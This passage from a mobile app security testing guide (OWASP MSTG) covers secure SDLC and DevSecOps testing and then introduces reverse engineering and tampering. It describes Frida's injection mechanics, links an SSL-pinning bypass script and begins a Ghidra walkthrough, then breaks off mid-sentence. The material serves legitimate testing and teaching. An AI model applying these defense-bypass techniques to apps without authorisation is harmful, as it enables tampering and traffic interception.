  \textbf{Threat Modeling}, which is basically the identification,
  enumeration, prioritization, and initial handling of threats, is a
  foundational artifact that must be performed as architecture
  development and design progress. \textbf{Security Architecture}, a
  Threat Model factor, can be refined (for both software and hardware
  aspects) after the Threat Modeling phase. \textbf{Secure Coding rules}
  are established and the list of \textbf{Security tools} that will be
  used is created. The strategy for \textbf{Security testing} is
  clarified.
\item
  All security requirements and design considerations should be stored
  in the Application Life Cycle Management (ALM) system (also known as
  the issue tracker) that the development/ops team uses to ensure tight
  integration of security requirements into the development workflow.
  The security requirements should contain relevant source code snippets
  so that developers can quickly reference the snippets. Creating a
  dedicated repository that's under version control and contains only
  these code snippets is a secure coding strategy that's more beneficial
  than the traditional approach (storing the guidelines in word
  documents or PDFs).
\item
  \textbf{Securely develop the software}. To increase code security, you
  must complete activities such as \textbf{Security Code Reviews},
  \textbf{Static Application Security Testing}, and \textbf{Security
  Unit Testing}. Although quality analogues of these security activities
  exist, the same logic must be applied to security, e.g., reviewing,
  analyzing, and testing code for security defects (for example, missing
  input validation, failing to free all resources, etc.).
\item
  Next comes the long-awaited release candidate testing: both manual and
  automated \textbf{Penetration Testing} (``Pentests''). \textbf{Dynamic
  Application Security Testing} is usually performed during this phase
  as well.
\item
  After the software has been \textbf{Accredited} during
  \textbf{Acceptance} by all stakeholders, it can be safely transitioned
  to \textbf{Operation} teams and put in Production.
\item
  The last phase, too often neglected, is the safe
  \textbf{Decommissioning} of software after its end of use.
\end{itemize}

The picture below illustrates all the phases and artifacts:

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/1ac849125c0802c1919c86dd62f13c49723742af.jpg}
\caption{Images/Chapters/0x04b/SDLCOverview.jpg}
\end{figure}

Based on the project's general risk profile, you may simplify (or even
skip) some artifacts, and you may add others (formal intermediary
approvals, formal documentation of certain points, etc.). \textbf{Always
remember two things: an SDLC is meant to reduce risks associated with
software development, and it is a framework that helps you set up
controls to that end.} This this is a generic description of SDLC;
always tailor this framework to your projects.

\hypertarget{defining-a-test-strategy}{%
\subparagraph{Defining a Test Strategy}\label{defining-a-test-strategy}}

Test strategies specify the tests that will be performed during the SDLC
as well as testing frequency. Test strategies are used to make sure that
the final software product meets security objectives, which are
generally determined by clients' legal/marketing/corporate teams. The
test strategy is usually created during the Secure Design phase, after
risks have been clarified (during the Initiation phase) and before code
development (the Secure Implementation phase) begins. The strategy
requires input from activities such as Risk Management, previous Threat
Modeling, and Security Engineering.

A Test Strategy needn't be formally written: it may be described through
Stories (in Agile projects), quickly enumerated in checklists, or
specified as test cases for a given tool. However, the strategy must
definitely be shared because it must be implemented by a team other than
the team who defined it. Moreover, all technical teams must agree to it
to ensure that it doesn't place unacceptable burdens on any of them.

Test Strategies address topics such as the following:

\begin{itemize}
\tightlist
\item
  objectives and risk descriptions
\item
  plans for meeting objectives, risk reduction, which tests will be
  mandatory, who will perform them, how and when they will be performed
\item
  acceptance criteria
\end{itemize}

To track the testing strategy's progress and effectiveness, metrics
should be defined, continually updated during the project, and
periodically communicated. An entire book could be written about
choosing relevant metrics; the most we can say here is that they depend
on risk profiles, projects, and organizations. Examples of metrics
include the following:

\begin{itemize}
\tightlist
\item
  the number of stories related to security controls that have been
  successfully implemented
\item
  code coverage for unit tests of security controls and sensitive
  features
\item
  the number of security bugs found for each build via static analysis
  tools
\item
  trends in security bug backlogs (which may be sorted by urgency)
\end{itemize}

These are only suggestions; other metrics may be more relevant to your
project. Metrics are powerful tools for getting a project under control,
provided they give project managers a clear and synthetic perspective on
what is happening and what needs to be improved.

Distinguishing between tests performed by an internal team and tests
performed by an independent third party is important. Internal tests are
usually useful for improving daily operations, while third-party tests
are more beneficial to the whole organization. Internal tests can be
performed quite often, but third-party testing happens at most once or
twice a year; also, the former are less expensive than the latter. Both
are necessary, and many regulations mandate tests from an independent
third party because such tests can be more trustworthy.

\hypertarget{security-testing-in-waterfall}{%
\paragraph{Security Testing in
Waterfall}\label{security-testing-in-waterfall}}

\hypertarget{what-waterfall-is-and-how-testing-activities-are-arranged}{%
\subparagraph{What Waterfall Is and How Testing Activities Are
Arranged}\label{what-waterfall-is-and-how-testing-activities-are-arranged}}

Basically, SDLC doesn't mandate the use of any development life cycle:
it is safe to say that security can (and must!) be addressed in any
situation.

Waterfall methodologies were popular before the 21st century. The most
famous application is called the ``V model'', in which phases are
performed in sequence and you can backtrack only a single step. The
testing activities of this model occur in sequence and are performed as
a whole, mostly at the point in the life cycle when most of the app
development is complete. This activity sequence means that changing the
architecture and other factors that were set up at the beginning of the
project is hardly possible even though code may be changed after defects
have been identified.

\hypertarget{security-testing-for-agiledevops-and-devsecops}{%
\paragraph{Security Testing for Agile/DevOps and
DevSecOps}\label{security-testing-for-agiledevops-and-devsecops}}

DevOps refers to practices that focus on a close collaboration between
all stakeholders involved in software development (generally called
Devs) and operations (generally called Ops). DevOps is not about merging
Devs and Ops. Development and operations teams originally worked in
silos, when pushing developed software to production could take a
significant amount of time. When development teams made moving more
deliveries to production necessary by working with Agile, operation
teams had to speed up to match the pace. DevOps is the necessary
evolution of the solution to that challenge in that it allows software
to be released to users more quickly. This is largely accomplished via
extensive build automation, the process of testing and releasing
software, and infrastructure changes (in addition to the collaboration
aspect of DevOps). This automation is embodied in the deployment
pipeline with the concepts of Continuous Integration and Continuous
Delivery (CI/CD).

People may assume that the term ``DevOps'' represents collaboration
between development and operations teams only, however, as DevOps
thought leader Gene Kim puts it: ``At first blush, it seems as though
the problems are just between Devs and Ops, but test is in there, and
you have information security objectives, and the need to protect
systems and data. These are top-level concerns of management, and they
have become part of the DevOps picture.''

In other words, DevOps collaboration includes quality teams, security
teams, and many other teams related to the project. When you hear
``DevOps'' today, you should probably be thinking of something like
\href{https://techbeacon.com/evolution-devops-new-thinking-gene-kim}{DevOpsQATestInfoSec}.
Indeed, DevOps values pertain to increasing not only speed but also
quality, security, reliability, stability, and resilience.

Security is just as critical to business success as the overall quality,
performance, and usability of an application. As development cycles are
shortened and delivery frequencies increased, making sure that quality
and security are built in from the very beginning becomes essential.
\textbf{DevSecOps} is all about adding security to DevOps processes.
Most defects are identified during production. DevOps specifies best
practices for identifying as many defects as possible early in the life
cycle and for minimizing the number of defects in the released
application.

However, DevSecOps is not just a linear process oriented towards
delivering the best possible software to operations; it is also a
mandate that operations closely monitor software that's in production to
identify issues and fix them by forming a quick and efficient feedback
loop with development. DevSecOps is a process through which Continuous
Improvement is heavily emphasized.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/28bf4372b490e7da769b83110e865b5dfbbac14d.jpg}
\caption{Images/Chapters/0x04b/DevSecOpsProcess.JPG}
\end{figure}

The human aspect of this emphasis is reflected in the creation of
cross-functional teams that work together to achieve business outcomes.
This section is focused on necessary interactions and integrating
security into the development life cycle (which starts with project
inception and ends with the delivery of value to users).

\hypertarget{what-agile-and-devsecops-are-and-how-testing-activities-are-arranged}{%
\subparagraph{What Agile and DevSecOps Are and How Testing Activities
Are
Arranged}\label{what-agile-and-devsecops-are-and-how-testing-activities-are-arranged}}

Overview

Automation is a key DevSecOps practice: as stated earlier, the frequency
of deliveries from development to operation increases when compared to
the traditional approach, and activities that usually require time need
to keep up, e.g.~deliver the same added value while taking more time.
Unproductive activities must consequently be abandoned, and essential
tasks must be fastened. These changes impact infrastructure changes,
deployment, and security:

\begin{itemize}
\tightlist
\item
  infrastructure is being implemented as \textbf{Infrastructure as Code}
\item
  deployment is becoming more scripted, translated through the concepts
  of \textbf{Continuous Integration} and \textbf{Continuous Delivery}
\item
  \textbf{security activities} are being automated as much as possible
  and taking place throughout the life cycle
\end{itemize}

The following sections provide more details about these three points.

Infrastructure as Code

Instead of manually provisioning computing resources (physical servers,
virtual machines, etc.) and modifying configuration files,
Infrastructure as Code is based on the use of tools and automation to
fasten the provisioning process and make it more reliable and
repeatable. Corresponding scripts are often stored under version control
to facilitate sharing and issue resolution.

Infrastructure as Code practices facilitate collaboration between
development and operations teams, with the following results:

\begin{itemize}
\tightlist
\item
  Devs better understand infrastructure from a familiar point of view
  and can prepare resources that the running application will require.
\item
  Ops operate an environment that better suits the application, and they
  share a language with Devs.
\end{itemize}

Infrastructure as Code also facilitates the construction of the
environments required by classical software creation projects, for
\textbf{development} (``DEV''), \textbf{integration} (``INT''),
\textbf{testing} (``PPR'' for Pre-Production. Some tests are usually
performed in earlier environments, and PPR tests mostly pertain to
non-regression and performance with data that's similar to data used in
production), and \textbf{production} (``PRD''). The value of
infrastructure as code lies in the possible similarity between
environments (they should be the same).

Infrastructure as Code is commonly used for projects that have
Cloud-based resources because many vendors provide APIs that can be used
for provisioning items (such as virtual machines, storage spaces, etc.)
and working on configurations (e.g., modifying memory sizes or the
number of CPUs used by virtual machines). These APIs provide
alternatives to administrators' performing these activities from
monitoring consoles.

The main tools in this domain are \href{https://puppet.com/}{Puppet},
\href{https://www.terraform.io/}{Terraform},
\href{https://www.packer.io/}{Packer},
\href{https://www.chef.io/chef/}{Chef} and
\href{https://www.ansible.com/}{Ansible}.

Deployment

The deployment pipeline's sophistication depends on the maturity of the
project organization or development team. In its simplest form, the
deployment pipeline consists of a commit phase. The commit phase usually
involves running simple compiler checks and the unit test suite as well
as creating a deployable artifact of the application. A release
candidate is the latest version that has been checked into the trunk of
the version control system. Release candidates are evaluated by the
deployment pipeline for conformity to standards they must fulfill for
deployment to production.

The commit phase is designed to provide instant feedback to developers
and is therefore run on every commit to the trunk. Time constraints
exist because of this frequency. The commit phase should usually be
complete within five minutes, and it shouldn't take longer than ten.
Adhering to this time constraint is quite challenging when it comes to
security because many security tools can't be run quickly enough
(\#paul, \#mcgraw).

CI/CD means ``Continuous Integration/Continuous Delivery'' in some
contexts and ``Continuous Integration/Continuous Deployment'' in others.
Actually, the logic is:

\begin{itemize}
\tightlist
\item
  Continuous Integration build actions (either triggered by a commit or
  performed regularly) use all source code to build a candidate release.
  Tests can then be performed and the release's compliance with
  security, quality, etc., rules can be checked. If case compliance is
  confirmed, the process can continue; otherwise, the development team
  must remediate the issue(s) and propose changes.
\item
  Continuous Delivery candidate releases can proceed to the
  pre-production environment. If the release can then be validated
  (either manually or automatically), deployment can continue. If not,
  the project team will be notified and proper action(s) must be taken.
\item
  Continuous Deployment releases are directly transitioned from
  integration to production, e.g., they become accessible to the user.
  However, no release should go to production if significant defects
  have been identified during previous activities.
\end{itemize}

The delivery and deployment of applications with low or medium
sensitivity may be merged into a single step, and validation may be
performed after delivery. However, keeping these two actions separate
and using strong validation are strongly advised for sensitive
applications.

Security

At this point, the big question is: now that other activities required
for delivering code are completed significantly faster and more
effectively, how can security keep up? How can we maintain an
appropriate level of security? Delivering value to users more often with
decreased security would definitely not be good!

Once again, the answer is automation and tooling: by implementing these
two concepts throughout the project life cycle, you can maintain and
improve security. The higher the expected level of security, the more
controls, checkpoints, and emphasis will take place. The following are
examples:

\begin{itemize}
\tightlist
\item
  Static Application Security Testing can take place during the
  development phase, and it can be integrated into the Continuous
  Integration process with more or less emphasis on scan results. You
  can establish more or less demanding Secure Coding Rules and use SAST
  tools to check the effectiveness of their implementation.
\item
  Dynamic Application Security Testing may be automatically performed
  after the application has been built (e.g., after Continuous
  Integration has taken place) and before delivery, again, with more or
  less emphasis on results.
\item
  You can add manual validation checkpoints between consecutive phases,
  for example, between delivery and deployment.
\end{itemize}

The security of an application developed with DevOps must be considered
during operations. The following are examples:

\begin{itemize}
\tightlist
\item
  Scanning should take place regularly (at both the infrastructure and
  application level).
\item
  Pentesting may take place regularly. (The version of the application
  used in production is the version that should be pentested, and the
  testing should take place in a dedicated environment and include data
  that's similar to the production version data. See the section on
  Penetration Testing for more details.)
\item
  Active monitoring should be performed to identify issues and remediate
  them as soon as possible via the feedback loop.
\end{itemize}

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/475043742486ea4fadf4922cde94a2395cceba4a.jpg}
\caption{Example of a DevSecOps process}
\end{figure}

\hypertarget{references}{%
\subsubsection{References}\label{references}}

\begin{itemize}
\tightlist
\item
  {[}paul{]} - M. Paul. Official (ISC)2 Guide to the CSSLP CBK, Second
  Edition ((ISC)2 Press), 2014
\item
  {[}mcgraw{]} - G McGraw. Software Security: Building Security In, 2006
\end{itemize}

\hypertarget{owasp-masvs}{%
\paragraph{OWASP MASVS}\label{owasp-masvs}}

\begin{itemize}
\tightlist
\item
  MSTG-ARCH-1: ``All app components are identified and known to be
  needed.''
\item
  MSTG-ARCH-3: ``A high-level architecture for the mobile app and all
  connected remote services has been defined and security has been
  addressed in that architecture.''
\item
  MSTG-ARCH-4: ``Data considered sensitive in the context of the mobile
  app is clearly identified.''
\item
  MSTG-ARCH-5: ``All app components are defined in terms of the business
  functions and/or security functions they provide.''
\item
  MSTG-ARCH-6: ``A threat model for the mobile app and the associated
  remote services has been produced that identifies potential threats
  and countermeasures.''
\item
  MSTG-ARCH-7: ``All security controls have a centralized
  implementation.''
\item
  MSTG-ARCH-10: ``Security is addressed within all parts of the software
  development lifecycle.''
\end{itemize}

\hypertarget{tampering-and-reverse-engineering}{%
\subsection{Tampering and Reverse
Engineering}\label{tampering-and-reverse-engineering}}

Reverse engineering and tampering techniques have long belonged to the
realm of crackers, modders, malware analysts, etc. For ``traditional''
security testers and researchers, reverse engineering has been more of a
complementary skill. But the tides are turning: mobile app black-box
testing increasingly requires disassembling compiled apps, applying
patches, and tampering with binary code or even live processes. The fact
that many mobile apps implement defenses against unwelcome tampering
doesn't make things easier for security testers.

Reverse engineering a mobile app is the process of analyzing the
compiled app to extract information about its source code. The goal of
reverse engineering is \emph{comprehending} the code.

\emph{Tampering} is the process of changing a mobile app (either the
compiled app or the running process) or its environment to affect its
behavior. For example, an app might refuse to run on your rooted test
device, making it impossible to run some of your tests. In such cases,
you'll want to alter the app's behavior.

Mobile security testers are served well by understanding basic reverse
engineering concepts. They should also know mobile devices and operating
systems inside out: processor architecture, executable format,
programming language intricacies, and so forth.

Reverse engineering is an art, and describing its every facet would fill
a whole library. The sheer range of techniques and specializations is
mind-blowing: one can spend years working on a very specific and
isolated sub-problem, such as automating malware analysis or developing
novel de-obfuscation methods. Security testers are generalists; to be
effective reverse engineers, they must filter through the vast amount of
relevant information.

There is no generic reverse engineering process that always works. That
said, we'll describe commonly used methods and tools later in this
guide, and give examples of tackling the most common defenses.

\hypertarget{why-you-need-it}{%
\subsubsection{Why You Need It}\label{why-you-need-it}}

Mobile security testing requires at least basic reverse engineering
skills for several reasons:

\textbf{1. To enable black-box testing of mobile apps.} Modern apps
often include controls that will hinder dynamic analysis. SSL pinning
and end-to-end (E2E) encryption sometimes prevent you from intercepting
or manipulating traffic with a proxy. Root detection could prevent the
app from running on a rooted device, preventing you from using advanced
testing tools. You must be able to deactivate these defenses.

\textbf{2. To enhance static analysis in black-box security testing.} In
a black-box test, static analysis of the app bytecode or binary code
helps you understand the internal logic of the app. It also allows you
to identify flaws such as hardcoded credentials.

\textbf{3. To assess resilience against reverse engineering.} Apps that
implement the software protection measures listed in the Mobile
Application Security Verification Standard Anti-Reversing Controls
(MASVS-R) should withstand reverse engineering to a certain degree. To
verify the effectiveness of such controls, the tester may perform a
\emph{resilience assessment} as part of the general security test. For
the resilience assessment, the tester assumes the role of the reverse
engineer and attempts to bypass defenses.

Before we dive into the world of mobile app reversing, we have some good
news and some bad news. Let's start with the good news:

\textbf{Ultimately, the reverse engineer always wins.}

This is particularly true in the mobile industry, where the reverse
engineer has a natural advantage: the way mobile apps are deployed and
sandboxed is by design more restrictive than the deployment and
sandboxing of classical Desktop apps, so including the rootkit-like
defensive mechanisms often found in Windows software (e.g., DRM systems)
is simply not feasible. The openness of Android allows reverse engineers
to make favorable changes to the operating system, aiding the reverse
engineering process.~iOS gives reverse engineers less control, but
defensive options are also more limited.

The bad news is that dealing with multi-threaded anti-debugging
controls, cryptographic white-boxes, stealthy anti-tampering features,
and highly complex control flow transformations is not for the
faint-hearted. The most effective software protection schemes are
proprietary and won't be beaten with standard tweaks and tricks.
Defeating them requires tedious manual analysis, coding, frustration,
and---depending on your personality---sleepless nights and strained
relationships.

It's easy for beginners to get overwhelmed by the sheer scope of
reversing. The best way to get started is to set up some basic tools
(see the relevant sections in the Android and iOS reversing chapters)
and start with simple reversing tasks and crackmes. You'll need to learn
about the assembler/bytecode language, the operating system,
obfuscations you encounter, and so on. Start with simple tasks and
gradually level up to more difficult ones.

In the following section. we'll give an overview of the techniques most
commonly used in mobile app security testing. In later chapters, we'll
drill down into OS-specific details of both Android and iOS.

\hypertarget{basic-tampering-techniques}{%
\subsubsection{Basic Tampering
Techniques}\label{basic-tampering-techniques}}

\hypertarget{binary-patching}{%
\paragraph{Binary Patching}\label{binary-patching}}

\emph{Patching} is the process of changing the compiled app, e.g.,
changing code in binary executables, modifying Java bytecode, or
tampering with resources. This process is known as \emph{modding} in the
mobile game hacking scene. Patches can be applied in many ways,
including editing binary files in a hex editor and decompiling, editing,
and re-assembling an app. We'll give detailed examples of useful patches
in later chapters.

Keep in mind that modern mobile operating systems strictly enforce code
signing, so running modified apps is not as straightforward as it used
to be in desktop environments. Security experts had a much easier life
in the 90s! Fortunately, patching is not very difficult if you work on
your own device---you simply have to re-sign the app or disable the
default code signature verification facilities to run modified code.

\hypertarget{code-injection}{%
\paragraph{Code Injection}\label{code-injection}}

Code injection is a very powerful technique that allows you to explore
and modify processes at runtime. Injection can be implemented in various
ways, but you'll get by without knowing all the details thanks to freely
available, well-documented tools that automate the process. These tools
give you direct access to process memory and important structures such
as live objects instantiated by the app. They come with many utility
functions that are useful for resolving loaded libraries, hooking
methods and native functions, and more. Process memory tampering is more
difficult to detect than file patching, so it is the preferred method in
most cases.

Substrate, Frida, and Xposed are the most widely used hooking and code
injection frameworks in the mobile industry. The three frameworks differ
in design philosophy and implementation details: Substrate and Xposed
focus on code injection and/or hooking, while Frida aims to be a
full-blown ``dynamic instrumentation framework'', incorporating code
injection, language bindings, and an injectable JavaScript VM and
console.

However, you can also instrument apps with Substrate by using it to
inject Cycript, the programming environment (aka
``Cycript-to-JavaScript'' compiler) authored by Saurik of Cydia fame. To
complicate things even more, Frida's authors also created a fork of
Cycript called
\href{https://github.com/nowsecure/frida-cycript}{``frida-cycript''}. It
replaces Cycript's runtime with a Frida-based runtime called Mjølner.
This enables Cycript to run on all the platforms and architectures
maintained by frida-core (if you are confused at this point, don't
worry). The release of frida-cycript was accompanied by a blog post by
Frida's developer Ole titled ``Cycript on Steroids'', a title that
\href{https://www.reddit.com/r/ReverseEngineering/comments/50uweq/cycript_on_steroids_pumping_up_portability_and/}{Saurik
wasn't very fond of}.

We'll include examples of all three frameworks. We recommend starting
with Frida because it is the most versatile of the three (for this
reason, we'll also include more Frida details and examples). Notably,
Frida can inject a JavaScript VM into a process on both Android and iOS,
while Cycript injection with Substrate only works on iOS. Ultimately,
however, you can of course achieve many of the same goals with either
framework.

\hypertarget{frida}{%
\subparagraph{Frida}\label{frida}}

\href{https://www.frida.re}{Frida} is a free and open source dynamic
code instrumentation toolkit written in Vala by Ole André Vadla Ravnås
that works by injecting a JavaScript engine
(\href{https://duktape.org/}{Duktape} and
\href{https://v8.dev/docs}{V8}) into the instrumented process. Frida
lets you execute snippets of JavaScript into native apps on Android and
iOS (as well as on \href{https://www.frida.re/docs/home/}{other
platforms}).

Code can be injected in several ways. For example, Xposed permanently
modifies the Android app loader, providing hooks for running your own
code every time a new process is started. In contrast, Frida implements
code injection by writing code directly into process memory. When
attached to a running app:

\begin{itemize}
\tightlist
\item
  Frida uses ptrace to hijack a thread of a running process. This thread
  is used to allocate a chunk of memory and populate it with a
  mini-bootstrapper.
\item
  The bootstrapper starts a fresh thread, connects to the Frida
  debugging server that's running on the device, and loads a shared
  library that contains the Frida agent (\texttt{frida-agent.so}).
\item
  The agent establishes a bi-directional communication channel back to
  the tool (e.g.~the Frida REPL or your custom Python script).
\item
  The hijacked thread resumes after being restored to its original
  state, and process execution continues as usual.
\end{itemize}

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/b8545a63bbbd33e84277034f5674e52d35eb224c.png}
\caption{Frida Architecture" width="500}
\end{figure}

\begin{itemize}
\tightlist
\item
  \emph{Frida Architecture, source:
  \href{https://www.frida.re/docs/hacking}{https://www.frida.re/docs/hacking/}}
\end{itemize}

Frida offers three modes of operation:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Injected: this is the most common scenario when frida-server is
  running as a daemon in the iOS or Android device. frida-core is
  exposed over TCP, listening on localhost:27042 by default. Running in
  this mode is not possible on devices that are not rooted or
  jailbroken.
\item
  Embedded: this is the case when your device is not rooted nor
  jailbroken (you cannot use ptrace as an unprivileged user), you're
  responsible for the injection of the
  \href{https://www.frida.re/docs/gadget/}{frida-gadget} library by
  embedding it into your app.
\item
  Preloaded: similar to \texttt{LD\_PRELOAD} or
  \texttt{DYLD\_INSERT\_LIBRARIES}. You can configure the frida-gadget
  to run autonomously and load a script from the filesystem (e.g.~path
  relative to where the Gadget binary resides).
\end{enumerate}

Independently of the chosen mode, you can make use of the
\href{https://www.frida.re/docs/javascript-api/}{Frida JavaScript APIs}
to interact with the running process and its memory. Some of the
fundamental APIs are:

\begin{itemize}
\tightlist
\item
  \href{https://www.frida.re/docs/javascript-api/\#interceptor}{Interceptor}:
  When using the Interceptor API, Frida injects a trampoline (aka
  in-line hooking) at the function prologue which provokes a redirection
  to our custom code, executes our code, and returns to the original
  function. Note that while very effective for our purpose, this
  introduces a considerable overhead (due to the trampoline related
  jumping and context switching) and cannot be considered transparent as
  it overwrites the original code and acts similar to a debugger
  (putting breakpoints) and therefore can be detected in a similar
  manner, e.g.~by applications that periodically checksum their own
  code.
\item
  \href{https://www.frida.re/docs/javascript-api/\#stalker}{Stalker}: If
  your tracing requirements include transparency, performance and high
  granularity, Stalker should be your API of choice. When tracing code
  with the Stalker API, Frida leverages just-in-time dynamic
  recompilation (by using
  \href{http://www.capstone-engine.org/}{Capstone}): when a thread is
  about to execute its next instructions, Stalker allocates some memory,
  copies the original code over, and interlaces the copy with your
  custom code for instrumentation. Finally, it executes the copy
  (leaving the original code untouched, and therefore avoiding any
  anti-debugging checks). This approach increases instrumentation
  performance considerably and allows for very high granularity when
  tracing (e.g.~by tracing exclusively CALL or RET instructions). You
  can learn more in-depth details in
  \href{https://medium.com/@oleavr/anatomy-of-a-code-tracer-b081aadb0df8}{the
  blog post ``Anatomy of a code tracer'' by Frida's creator Ole}
  {[}\#vadla{]}. Some examples of use for Stalker are, for example
  \href{https://codeshare.frida.re/@oleavr/who-does-it-call/}{who-does-it-call}
  or
  \href{https://github.com/frida/frida-presentations/blob/master/R2Con2017/01-basics/02-diff-calls.js}{diff-calls}.
\item
  \href{https://www.frida.re/docs/javascript-api/\#java}{Java}: When
  working on Android you can use this API to enumerate loaded classes,
  enumerate class loaders, create and use specific class instances,
  enumerate live instances of classes by scanning the heap, etc.
\item
  \href{https://www.frida.re/docs/javascript-api/\#objc}{ObjC}: When
  working on iOS you can use this API to get a mapping of all registered
  classes, register or use specific class or protocol instances,
  enumerate live instances of classes by scanning the heap, etc.
\end{itemize}

Frida also provides a couple of simple tools built on top of the Frida
API and available right from your terminal after installing frida-tools
via pip. For instance:

\begin{itemize}
\tightlist
\item
  You can use the \href{https://www.frida.re/docs/frida-cli/}{Frida CLI}
  (\texttt{frida}) for quick script prototyping and try/error scenarios.
\item
  \href{https://www.frida.re/docs/frida-ps/}{\texttt{frida-ps}} to
  obtain a list of all apps (or processes) running on the device
  including their names and PDIs.
\item
  \href{https://www.frida.re/docs/frida-ls-devices/}{\texttt{frida-ls-devices}}
  to list your connected devices;
\item
  \href{https://www.frida.re/docs/frida-trace/}{\texttt{frida-trace}} to
  quickly trace methods that are part of an iOS app or that are
  implemented inside an Android native library.
\end{itemize}

In addition, you'll also find several open source Frida-based tools,
such as:

\begin{itemize}
\tightlist
\item
  \href{https://github.com/chaitin/passionfruit}{Passionfruit}: an iOS
  app blackbox assessment tool.
\item
  \href{https://github.com/Nightbringer21/fridump}{Fridump}: a memory
  dumping tool for both Android and iOS.
\item
  \href{https://github.com/sensepost/objection}{Objection}: a runtime
  mobile security assessment framework.
\item
  \href{https://github.com/nowsecure/r2frida}{r2frida}: a project
  merging the powerful reverse engineering capabilities of radare2 with
  the dynamic instrumentation toolkit of Frida.
\item
  \href{https://github.com/chame1eon/jnitrace}{jnitrace}: a tool for
  tracing usage of the Android JNI runtime methods by a native library.
\end{itemize}

We will be using all of these tools throughout the guide.

You can use these tools as-is, tweak them to your needs, or take as
excellent examples on how to use the APIs. Having them as an example is
very helpful when you write your own hooking scripts or when you build
introspection tools to support your reverse engineering workflow.

One more thing to mention is the Frida CodeShare project
(\url{https://codeshare.frida.re}). It contains a collection of
ready-to-run Frida scripts which can enormously help when performing
concrete tasks both on Android as on iOS as well as also serve as
inspiration to build your own scripts. Two representative examples are:

\begin{itemize}
\tightlist
\item
  Universal Android SSL Pinning Bypass with Frida -
  \url{https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/}
\item
  ObjC method observer -
  \url{https://codeshare.frida.re/@mrmacete/objc-method-observer/}
\end{itemize}

Using them is as simple as including the
\texttt{-\/-codeshare\ \textless{}handler\textgreater{}} flag and a
handler when using the Frida CLI. For example, to use ``ObjC method
observer'', enter the following:

\begin{verbatim}
$ frida --codeshare mrmacete/objc-method-observer -f YOUR_BINARY
\end{verbatim}

\hypertarget{static-and-dynamic-binary-analysis}{%
\subsubsection{Static and Dynamic Binary
Analysis}\label{static-and-dynamic-binary-analysis}}

Reverse engineering is the process of reconstructing the semantics of a
compiled program's source code. In other words, you take the program
apart, run it, simulate parts of it, and do other unspeakable things to
it to understand what it does and how.

\hypertarget{using-disassemblers-and-decompilers}{%
\paragraph{Using Disassemblers and
Decompilers}\label{using-disassemblers-and-decompilers}}

Disassemblers and decompilers allow you to translate an app's binary
code or bytecode back into a more or less understandable format. By
using these tools on native binaries, you can obtain assembler code that
matches the architecture the app was compiled for. Disassemblers convert
machine code to assembly code which in turn is used by decompilers to
generate equivalent high-level language code. Android Java apps can be
disassembled to smali, which is an assembly language for the DEX format
used by Dalvik, Android's Java VM. Smali assembly can also be quite
easily decompiled back to equivalent Java code.

In theory, the mapping between assembly and machine code should be
one-to-one, and therefore it may give the impression that disassembling
is a simple task. But in practice, there are multiple pitfalls such as:

\begin{itemize}
\tightlist
\item
  Reliable distinction between code and data.
\item
  Variable instruction size.
\item
  Indirect branch instructions.
\item
  Functions without explicit CALL instructions within the executable's
  code segment.
\item
  Position independent code (PIC) sequences.
\item
  Hand crafted assembly code.
\end{itemize}

On a similar vein, decompilation is a very complicated process,
involving many deterministic and heuristic based approaches. As a
consequence, decompilation is usually not really accurate, but
nevertheless very helpful in getting a quick understanding of the
function being analyzed. The accuracy of decompilation depends on the
amount of information available in the code being decompiled and the
sophistication of the decompiler. In addition, many compilation and
post-compilation tools introduce additional complexity to the compiled
code in order to increase the difficulty of comprehension and/or even
decompilation itself. Such code referred to as \emph{obfuscated code}.

Over the past decades many tools have perfected the process of
disassembly and decompilation, producing output with high fidelity.
Advanced usage instructions for any of the available tools can often
easily fill a book of their own. The best way to get started is to
simply pick up a tool that fits your needs and budget and get a
well-reviewed user guide. In this section, we will provide an
introduction to some of those tools and in the subsequent ``Reverse
Engineering and Tampering'' Android and iOS chapters we'll focus on the
techniques themselves, especially those that are specific to the
platform at hand.

\hypertarget{ghidra}{%
\subparagraph{Ghidra}\label{ghidra}}

Ghidra is an open source software reverse engineering (SRE) suite of
tools developed by the United State of America's National Security
Agency's (NSA) Research Directorate. Ghidra is a versatile tool which
comprises of a disassembler, decompiler and a built-in scripting engine
for advanced usage. Please refer to the
\href{https://ghidra-sre.org/InstallationGuide.html}{installation guide}
on how to install it and also look at the
\href{https://ghidra-sre.org/CheatSheet.html}{cheat sheet} for a first
overview of available commands and shortcuts. In this section, we will
have walk-through on how to create a project, view disassembly and
decompiled code for a binary.

Start Ghidra using \texttt{ghidraRun} (*nix) or \texttt{ghidraRun.bat}
(Windows), depending on the platform you are on. Once Ghidra is fired
up, create a new project by specifying the project directory. You will
be greeted by a window as shown below:

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/9a0c01a9582fcd5d3aac500e683e7ba7cfbab2fe.png}
\caption{Ghidra New Project" width="500}
\end{figure}

In your new \textbf{Active Project} you can import an app binary by
going to \textbf{File} -\textgreater{} \textbf{Import File} and choosing
the desired file.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/186d6939c74e4d7ed97a499be236f2eae40edfb4.png}
\caption{Ghidra import binary" width="500}
\end{figure}

If the file can be properly processed, Ghidra will show meta-information
about the binary before starting the analysis.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/222cb525d0a89b02ee9868add6220f38f7d8eec4.png}
\caption{Ghidra ELF file import" width="350}
\end{figure}

To get the disassembled code for the binary file chosen above, double
click the imported file from the \textbf{Active Project} window. Click
\textbf{yes} and \textbf{analyze} for auto-analysis on the subsequent
windows. Auto-analysis will take some time depending on the size of the
binary, the progress can be tracked in the bottom right corner of the
code browser window. Once auto-analysis is completed you can start
exploring the binary.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/f5ea8252ffeab6775a9e3cc315bf3623aacaa026.png}
\caption{Ghidra Main Window}
\end{figure}

The most important windows to explore a binary in Ghidra are the
\textbf{Listing} (Disassembly) window, the \textbf{Symbol Tree} window
and the \textbf{Decompiler} window, which shows the decompiled version
